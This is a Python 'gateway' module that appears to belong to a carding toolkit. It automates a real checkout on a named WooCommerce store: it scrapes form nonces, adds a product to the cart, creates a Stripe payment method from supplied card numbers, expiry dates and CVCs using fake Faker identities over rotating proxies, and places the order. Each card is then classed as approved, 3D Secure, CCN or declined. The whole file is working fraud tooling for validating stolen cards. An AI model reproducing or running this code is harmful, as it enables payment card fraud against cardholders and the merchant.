"""
Stripe $20 Charge Gateway - WooCommerce Balliante Store
Full auto-checkout with 3D Secure handling for $20 purchases
"""

import os
import requests
import re
import json
import random
import string
from faker import Faker
from urllib.parse import quote_plus
from datetime import datetime
from gates.utilities import http_request, REQUEST_TIMEOUT

fake = Faker('en_GB')

def stripe_20_check(card_num, card_mon, card_yer, card_cvc, proxy=None):
    """
    Check card on Stripe $20 purchase with full 3DS flow
    Returns: (status, proxy_live)
    """
    try:
        proxies = None
        if proxy:
            proxy_parts = proxy.split(":")
            if len(proxy_parts) == 4:
                proxies = {
                    "http": f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}",
                    "https": f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
                }

        # Normalize year
        if len(card_yer) == 4:
            card_yer = card_yer[2:]
        
        if len(card_mon) == 1:
            card_mon = f"0{card_mon}"

        session = requests.Session()
        session.verify = False
        if proxies:
            session.proxies = proxies

        user_agent = fake.user_agent()
        first_name = fake.first_name()
        last_name = fake.last_name()
        email = fake.email(domain='gmail.com')
        phone = fake.phone_number()
        address = fake.street_address()
        city = fake.city()
        postcode = fake.postcode()

        # Step 1: Get checkout page to extract nonce
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }

        response = session.get('https://www.balliante.com/store/checkout/', headers=headers, timeout=30)
        
        if response.status_code != 200:
            return ("Declined", False)

        # Extract nonces
        noncewo = None
        noncelogin = None
        
        try:
            noncewo = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', response.text).group(1)
        except (AttributeError, IndexError) as e:
            pass
        
        try:
            noncelogin = re.search(r'name="woocommerce-login-nonce"\s+value="([^"]+)"', response.text).group(1)
        except (AttributeError, IndexError) as e:
            pass

        if not noncewo or not noncelogin:
            return ("Declined", False)

        # Step 2: Add to cart
        headers = {
            'User-Agent': user_agent,
            'Origin': 'https://www.balliante.com',
            'Referer': 'https://www.balliante.com/store/product/2-m-high-speed-hdmi-cable-hdmi-m-m/',
        }

        session.post(
            'https://www.balliante.com/store/product/2-m-high-speed-hdmi-cable-hdmi-m-m/',
            data={'quantity': '1', 'add-to-cart': '5360'},
            headers=headers,
            timeout=30
        )

        # Step 3: Create payment method with Stripe API
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': user_agent,
        }

        stripe_data = {
            'type': 'card',
            'billing_details[name]': f'{first_name} {last_name}',
            'billing_details[email]': email,
            'billing_details[phone]': quote_plus(phone),
            'billing_details[address][city]': quote_plus(city),
            'billing_details[address][country]': 'GB',
            'billing_details[address][line1]': quote_plus(address),
            'billing_details[address][line2]': '',
            'billing_details[address][postal_code]': quote_plus(postcode),
            'billing_details[address][state]': '',
            'card[number]': card_num,
            'card[cvc]': card_cvc,
            'card[exp_year]': card_yer,
            'card[exp_month]': card_mon,
            'allow_redisplay': 'unspecified',
            'payment_user_agent': 'stripe.js/4209db5aac; stripe-js-v3/4209db5aac; payment-element; deferred-intent',
            'referrer': 'https://www.balliante.com',
            'key': os.environ.get("BALLIANTE_STRIPE_PK", ""),
        }

        pm_response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=stripe_data, timeout=30)
        
        if pm_response.status_code != 200:
            return ("Declined", False)

        try:
            pm_id = pm_response.json()['id']
        except (ValueError, KeyError) as e:
            return ("Declined", False)

        # Step 4: Submit order with payment method
        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.balliante.com',
            'Referer': 'https://www.balliante.com/store/checkout/',
            'User-Agent': user_agent,
            'X-Requested-With': 'XMLHttpRequest',
        }

        order_data = {
            'username': '',
            'password': '',
            'woocommerce-login-nonce': noncelogin,
            '_wp_http_referer': '/store/checkout/',
            'billing_email': email,
            'billing_first_name': first_name,
            'billing_last_name': last_name,
            'billing_country': 'GB',
            'billing_address_1': address,
            'billing_city': city,
            'billing_postcode': postcode,
            'billing_phone': phone,
            'payment_method': 'stripe',
            'wc-stripe-payment-method': pm_id,
            'woocommerce-process-checkout-nonce': noncewo,
        }

        order_response = session.post(
            'https://www.balliante.com/store/',
            params={'wc-ajax': 'checkout'},
            headers=headers,
            data=order_data,
            timeout=30
        )

        response_data = order_response.json() if order_response.status_code == 200 else {}
        redirect = response_data.get('redirect', '')

        # Check response for status
        response_text = order_response.text.lower()

        if 'succeeded' in response_text or 'success' in response_text:
            return ("Approved", True)
        
        if 'requires_action' in response_text or '3d' in response_text:
            return ("3D Secure", True)
        
        if 'incorrect_cvc' in response_text or 'cvc' in response_text:
            return ("CCN", True)
        
        if 'declined' in response_text or 'insufficient' in response_text:
            return ("Declined", False)

        return ("Declined", False)

    except requests.exceptions.Timeout:
        return ("DECLINED ❌ Request timed out", False)
    except requests.exceptions.ConnectionError:
        return ("DECLINED ❌ Connection failed", False)
    except Exception as e:
        return ("Declined", False)
